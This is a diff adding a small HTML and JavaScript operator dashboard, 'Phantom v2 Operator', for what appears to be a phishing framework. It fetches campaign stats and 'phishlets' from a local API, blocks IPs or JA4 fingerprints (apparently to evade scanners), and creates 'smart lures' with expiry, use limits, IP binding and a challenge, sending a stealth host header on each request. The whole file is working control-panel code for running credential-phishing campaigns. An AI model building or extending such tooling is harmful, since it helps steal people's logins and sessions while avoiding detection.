@@ -1,0 +1,32 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Phantom v2 Operator</title>
+<style>body{font-family:system-ui,sans-serif;max-width:900px;margin:2em auto;padding:0 1em;background:#0d1117;color:#c9d1d9}h1{color:#58a6ff}table{border-collapse:collapse;width:100%}td,th{border:1px solid #30363d;padding:.4em;text-align:left}input,button{padding:.4em;margin:.2em}button{background:#238636;color:#fff;border:0;border-radius:4px;cursor:pointer}#cfg{margin-bottom:1em}</style>
+</head><body>
+<h1>Phantom v2 Operator</h1>
+<div id="cfg">
+<input id="base" size="30" value="http://127.0.0.1:8080" placeholder="API base">
+<input id="stealth" size="30" value="api-internal.example.com" placeholder="X-Stealth-Host">
+<input id="token" size="30" type="password" placeholder="Bearer (if set)">
+<button onclick="save()">Save</button>
+</div>
+<h2>Stats</h2><pre id="stats">—</pre>
+<h2>Phishlets</h2><pre id="ph">—</pre>
+<h2>Block IP/JA4</h2>
+<input id="bkey" placeholder="1.2.3.4"><input id="breason" placeholder="reason"><button onclick="block()">Block</button>
+<h2>Smart lure</h2>
+<input id="lpath" placeholder="/l/abc01"><input id="lph" placeholder="phishlet id">
+<input id="lttl" placeholder="ttl min" size="8"><input id="luses" placeholder="max uses" size="8">
+<input id="lip" placeholder="bound ip (opt)" size="14"><label><input type="checkbox" id="lch"> challenge</label>
+<button onclick="mklure()">Create</button>
+<pre id="out"></pre>
+<script>
+let C={base:localStorage.pb||"",stealth:localStorage.ps||"",token:localStorage.pt||""};
+base.value=C.base||base.value;stealth.value=C.stealth||stealth.value;token.value=C.token||"";
+function save(){C={base:base.value,stealth:stealth.value,token:token.value};localStorage.pb=C.base;localStorage.ps=C.stealth;localStorage.pt=C.token;load();}
+function H(h){h=h||{};h["X-Stealth-Host"]=C.stealth;if(C.token)h["Authorization"]="Bearer "+C.token;return h;}
+async function load(){try{stats.textContent=JSON.stringify(await(await fetch(C.base+"/api/v1/stats",{headers:H()})).json(),null,1);ph.textContent=JSON.stringify(await(await fetch(C.base+"/api/v1/phishlets",{headers:H()})).json());}catch(e){stats.textContent="ERR "+e;}}
+async function block(){let r=await fetch(C.base+"/api/v1/block",{method:"POST",headers:H({"Content-Type":"application/json"}),body:JSON.stringify({key:bkey.value,reason:breason.value})});out.textContent="block "+r.status;}
+async function mklure(){let r=await fetch(C.base+"/api/v1/lures",{method:"POST",headers:H({"Content-Type":"application/json"}),body:JSON.stringify({path:lpath.value,phishlet_id:lph.value,ttl_min:+lttl.value||0,max_uses:+luses.value||0,bound_ip:lip.value,require_challenge:lch.checked})});out.textContent="lure "+r.status;}
+load();setInterval(load,5000);
+</script></body></html>
